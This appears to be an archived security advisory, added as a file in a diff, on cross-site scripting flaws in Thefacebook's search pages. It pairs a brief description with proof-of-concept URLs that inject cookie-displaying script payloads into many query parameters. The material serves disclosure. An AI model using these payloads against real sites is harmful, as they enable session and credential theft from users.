@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/11676/info
+
+It is reported that Thefacebook is affected by various cross-site scripting vulnerabilities. These issues are due to a failure of the application to properly sanitize user-supplied URI input. 
+
+These issues could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were to be followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.
+
+http://www.example.com/search.php?do_search=1&advanced=1&name=&email=&status=&sex=&year=&house=&room=&mailbox=&phone=%3Cscript%3Edocument.write%28document.cookie
+%29%3C%2Fscript%3E&birthday=&address=%3Cscript%3Edocument.write%28document.cookie%29%3C%2Fscript%3E&city=%3Cscript%3Edocument.write%28document.cookie%29%3C%2Fscript%3E&st
+ate=%3Cscript%3Edocument.write%28document.cookie%29%3C%2Fscript%3E&zip=%3Cscript%3Edocument.write%28document.cookie%29%3C%2Fscript%3E&concentration=&political=&screenname
+=&cell=&relationship=&meeting_for=&meeting_sex=&text=%3Cscript%3Edocument.write%28document.cookie%29%3C%2Fscript%3E
+
+http://www.example.com/global.php?do_search=1&high_school=1&state=1&city=2&hsid=1&changed=1&advanced=1&high_school=1&name=%3Cscript%3Edocument.write%28document.c
+ookie%29%3C%2Fscript%3E&hsyear=
+
+http://www.example.com/search.php?all_fields=0&do_search=1&advanced=1&group=%3Cscript%3Edocument.write%28document.cookie%29%3C%2Fscript%3E
